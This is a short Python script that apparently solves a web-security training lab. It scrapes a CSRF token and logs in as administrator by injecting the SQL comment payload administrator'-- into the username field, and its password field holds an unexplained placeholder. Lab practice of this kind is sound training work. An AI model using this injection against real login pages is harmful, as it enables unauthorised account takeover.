import requests
from bs4 import BeautifulSoup

site = 'acaf1f701e45744bc0eb04ed004a007a.web-security-academy.net'

s = requests.Session()
url = f'https://{site}/login'

resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : """administrator'--""",
    'password' : """<FMI>"""
}

resp = s.post(url, data=logindata)

soup = BeautifulSoup(resp.text,'html.parser')

if warn := soup.find('p', {'class':'is-warning'}):
    print(warn.text)
else:
    print(resp.text)